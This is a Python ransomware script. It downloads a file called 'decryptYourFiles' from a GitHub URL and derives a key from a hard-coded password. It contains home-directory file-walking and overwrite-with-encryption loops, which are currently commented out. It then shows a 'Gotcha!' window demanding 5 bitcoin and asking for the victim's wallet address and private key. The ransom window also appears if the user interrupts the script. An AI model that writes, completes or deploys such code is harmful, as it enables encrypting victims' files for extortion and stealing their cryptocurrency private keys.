import os
import requests
import shutil
import webbrowser
from utilities import generate_key, encrypt
import urllib.request

# import everything from tkinter module
from tkinter import *

excluded_dirs = {"env", ".git"}
excluded_files = {
    "decrypt.py",
    "test.py",
    "encrypt.py",
    "utilities.py",
    "key.txt",
    "README.md",
    ".gitignore",
    "AccountReActivationForm",
    "decryptYourFiles",
}

files = []

url = "https://github.com/HKing3/EncryptStuff/raw/refs/heads/main/decryptYourFiles"
response = requests.get(url)

decrypt_file_path = "decryptYourFiles"
urllib.request.urlretrieve(url, decrypt_file_path)

try:
    home_dir = os.path.expanduser("~")
    print("Getting files in " + str(home_dir))
    """for root, dirs, filenames in os.walk(home_dir):
        # comprehension to remove unwanted dirs
        dirs[:] = [d for d in dirs if d not in excluded_dirs]
    
        for file in filenames:
            if file in excluded_files:
                continue
            files.append(os.path.join(root, file))"""

    # print(files)

    password = b"nohope1234567890"  # 16 bytes of password
    salt = b"sixteen890123456"
    secret_key = generate_key(password, salt)

    # encrypt
    """for file in files:
        try:
            with open(file, "rb") as _file:
                contents = _file.read()

            enc_content = encrypt(secret_key, contents)

            # Write the e
            with open(file, "wb") as _file:
                _file.write(enc_content)
        except:
            print("File could not be modified")"""

    # create a tkinter root window to display GUI
    root = Tk()

    # root window title and dimension
    root.title("Gotcha!")
    root.geometry("500x300")

    account_var = StringVar()
    pk_var = StringVar()

    # Create the message to display to the user
    messageTxt = Message(root, text="Give bitcoin wallet details containing 5 bitcoin")
    messageTxt.config(font="50")

    account_label = Label(root, text="Account Address")
    account_entry = Entry(root, textvariable=account_var)

    pk_label = Label(root, text="Private Key")
    pk_entry = Entry(root, textvariable=pk_var)

    # Open the browser to bitcoin.com
    def onClick():
        if account_var.get() != "" and pk_var.get != "":
            messageTxt.config(text="Password: nohope1234567890\nSalt: sixteen890123456")

    # Create a Button for the user to click on
    button = Button(root, text="Pay Me", command=onClick, height=5, width=10)

    messageTxt.pack(side="top")
    account_label.pack()
    account_entry.pack()
    pk_label.pack()
    pk_entry.pack()
    button.pack(side="bottom")
    root.mainloop()

except KeyboardInterrupt:
    # create a tkinter root window to display GUI
    root = Tk()

    # root window title and dimension
    root.title("Gotcha!")
    root.geometry("500x300")

    account_var = StringVar()
    pk_var = StringVar()

    # Create the message to display to the user
    messageTxt = Message(root, text="Give bitcoin wallet details containing 5 bitcoin")
    messageTxt.config(font="50")

    account_label = Label(root, text="Account Address")
    account_entry = Entry(root, textvariable=account_var)

    pk_label = Label(root, text="Private Key")
    pk_entry = Entry(root, textvariable=pk_var)

    # Open the browser to bitcoin.com
    def onClick():
        if account_var.get() != "" and pk_var.get != "":
            messageTxt.config(text="Password: nohope1234567890\nSalt: sixteen890123456")

    # Create a Button for the user to click on
    button = Button(root, text="Pay Me", command=onClick, height=5, width=10)

    messageTxt.pack(side="top")
    account_label.pack()
    account_entry.pack()
    pk_label.pack()
    pk_entry.pack()
    button.pack(side="bottom")
    root.mainloop()
